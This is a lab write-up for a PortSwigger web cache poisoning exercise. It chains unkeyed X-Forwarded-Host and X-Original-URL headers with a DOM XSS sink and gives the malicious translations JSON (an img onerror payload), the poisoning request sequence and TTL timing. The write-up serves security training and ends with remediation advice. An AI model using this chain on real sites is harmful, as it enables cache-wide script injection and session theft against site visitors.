# Lab 11: Combining Web Cache Poisoning Vulnerabilities

**Category:** Web Cache Poisoning
**Difficulty:** Expert
**Lab link:** [Combining web cache poisoning vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)

## Overview

No single vulnerability is enough. The attack chains three weaknesses:

1. `X-Forwarded-Host` is unkeyed and reflected into an `initTranslations()` call that imports a JSON file — controllable via the header.
2. `initTranslations()` sets translation values via `innerHTML`, making it a DOM XSS sink for non-English languages.
3. The victim is English-speaking, so the language must be forced to Spanish first. `GET /` with `X-Original-Url: /setlang\es` produces a **cacheable 302** to `/setlang/es` (the direct path sets a cookie and is not cacheable; the backslash variant bypasses this).

Both poisoned cache entries must be live simultaneously when the victim visits.

## Key Concepts

- **Chained cache poisoning:** multiple unkeyed inputs (`X-Forwarded-Host`, `X-Original-URL`) combined to reach a DOM XSS sink.
- **Cacheable redirect via backslash:** `/setlang\es` triggers a 302 without setting a cookie, making it cacheable; `/setlang/es` sets a cookie and is not.
- **Language forcing:** English users are immune to the DOM XSS — the attack first redirects them to Spanish via the poisoned `GET /` entry.
- **Race timing:** both cache entries have a 30s TTL; they must be repoisoned in sequence faster than they expire.

## Exploit Server Setup

**File:** `/resources/json/translations.json`  
**Response headers:**
```
Access-Control-Allow-Origin: *
Content-Type: application/json
```

**Body:**
```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror=alert(document.cookie)>",
            "Description:": "Descripción:"
        }
    }
}
```

The `"View details"` translation is injected via `innerHTML` inside an `<a>` tag — the payload closes the tag and fires `onerror`.

## Solution

### Step 1 — Identify unkeyed headers

Run Param Miner on the home page. It finds both `X-Forwarded-Host` and `X-Original-URL` are supported and unkeyed.

### Step 2 — Confirm X-Forwarded-Host reflects

Send `GET /?localized=1` with `X-Forwarded-Host: <exploit-server>`. Response contains:
```javascript
initTranslations('//' + data.host + '/resources/json/translations.json');
```
where `data.host` is set to your exploit server.

### Step 3 — Confirm cacheable redirect

Send `GET /` with `X-Original-Url: /setlang\es`. Response is `302` to `/setlang/es` with `X-Cache: hit` on second send.

### Step 4 — Set up exploit server

Host `/resources/json/translations.json` with `Access-Control-Allow-Origin: *` and the malicious JSON above.

### Step 5 — Poison in sequence

1. Send `GET /?localized=1` + `X-Forwarded-Host: <exploit-server>` until `X-Cache: hit`.
2. Immediately send `GET /` + `X-Original-Url: /setlang\es` until `X-Cache: hit`.
3. Replay both every ~25 seconds (TTL is 30s).

### Step 6 — Victim chain

Victim visits `/` → poisoned cache serves 302 to `/setlang/es` → sets `lang=es` cookie → reloads `/?localized=1` → poisoned response loads translations from exploit server → `initTranslations()` injects payload into DOM → `alert(document.cookie)` fires.

## Remediation

- Include `X-Forwarded-Host` and `X-Original-URL` in the cache key or strip them at the cache layer.
- Sanitise values before passing them to `innerHTML` or other DOM sinks.
- Do not cache redirect responses triggered by user-controlled path overrides.
- Apply a `Content-Security-Policy` to restrict inline event handlers and untrusted script sources.

## Key Takeaways

- Expert-level cache poisoning often requires chaining: one vulnerability alone is not enough.
- Backslash in paths is a classic technique to get cacheable redirects when the direct path is excluded.
- Both poisoned entries must be live simultaneously — timing and TTL management are part of the exploit.
